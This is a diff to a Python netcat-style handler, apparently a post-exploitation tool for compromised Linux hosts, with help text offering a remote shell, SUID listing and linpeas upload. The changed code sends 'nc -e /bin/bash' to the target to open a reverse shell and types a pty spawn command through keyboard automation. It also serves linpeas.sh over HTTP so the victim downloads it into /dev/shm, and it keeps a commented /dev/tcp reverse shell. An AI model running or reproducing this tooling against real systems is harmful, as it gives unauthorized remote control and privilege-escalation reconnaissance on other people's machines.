@@ -7,7 +7,6 @@ import time
 import subprocess
 import signal
 import random
-import keyboard
 import pynput
 from pynput.keyboard import Key, Controller
 
@@ -25,7 +24,7 @@ class netcat(object):
     bufferSize = 2**12
 
 
-    
+
     def usage(self,value):
         if value == 'local':
             print("""
@@ -41,8 +40,8 @@ class netcat(object):
         elif value == 'rhost':
             print("""
                 WE ARE ON ! WHAT CAN I DO ?
-                [OPTIONS] : 
-                \t\tFirst, you can execute almost same commands like real shell! 
+                [OPTIONS] :
+                \t\tFirst, you can execute almost same commands like real shell!
                 \t\thelp\t\tget some help ;)
                 \t\tsuid\t\tget all suid binaries !
                 \t\tlinpeas\t\tupload linpeas.sh on machine
@@ -50,7 +49,7 @@ class netcat(object):
                 """)
 
 
-        
+
 
     def main(self):
 
@@ -61,10 +60,10 @@ class netcat(object):
         for arg in listArgs:
             arg = arg.replace(' ','%')
             newListArgs.append(arg)
-        
+
         if not len(sys.argv[1:]):
             self.usage(self.value)
-            
+
         for opt in newListArgs:
             #print(opt)
             if opt == "listen%" or opt == "l%" or opt == "listen" or opt == "l":
@@ -168,6 +167,7 @@ class netcat(object):
                 self.listSuid(conn)
             elif command == "shell":
                 self.shell(conn)
+                conn.recv(self.bufferSize)
             else:
                 conn.send(command.encode())
                 fini = "false"
@@ -176,8 +176,8 @@ class netcat(object):
                     print(recv)
                     if len(recv) < self.bufferSize:
                         fini = "true"
-    
-    
+
+
 
 
 #####################################################
@@ -209,16 +209,14 @@ class netcat(object):
             time.sleep(1)
             cmd = "nc -e /bin/bash %s %s &"%(ip,port)
             conn.send(cmd.encode())
+            #print(conn.recv(self.bufferSize).decode())
             keyboard = Controller()
-            string = """python -c 'import pty;pty.spawn("/bin/bash")'"""
+            string = """python3 -c 'import pty;pty.spawn("/bin/bash")'"""
             for s in string:
                 keyboard.press(s)
+                keyboard.release(s)
             keyboard.press(Key.enter)
-            #keyboard.press_and_release('alt','tab')
-            #keyboard.write('toto')
-            #keyboard.press('enter')
-            #keyboard.write('''export TERM=xterm''')
-            #keyboard.press('enter')
+            keyboard.release(Key.enter)
         else:
             print('toto')
             #cmd = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1 &"
@@ -249,19 +247,19 @@ class netcat(object):
 
 
     def wgetLinpeas(self,conn):
-        os.chdir('/root/aht/peas')
+        os.chdir('/opt/peass/')
         CMD = subprocess.Popen("python3 -m http.server", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         pid = CMD.pid + 1
         time.sleep(2)
         name = socket.gethostname()
         ip = socket.gethostbyname(name)
-        command = "wget http://%s:8000/linpeas.sh"%(ip)
+        command = "wget http://%s:8000/linpeas.sh -O /dev/shm/linpeas.sh"%(ip)
         conn.send(command.encode())
         while True:
             response = conn.recv(self.bufferSize).decode()
             print(response)
             if len(response) < self.bufferSize:
-                os.kill(pid, signal.SIGTERM) 
+                os.kill(pid, signal.SIGTERM)
                 break
 
 
@@ -292,10 +290,9 @@ class netcat(object):
             self.tag = "$"
         else:
             self.tag = "#"
- 
 
-        
+
+
 if __name__ == "__main__":
    ncat = netcat()
    ncat.main()
-
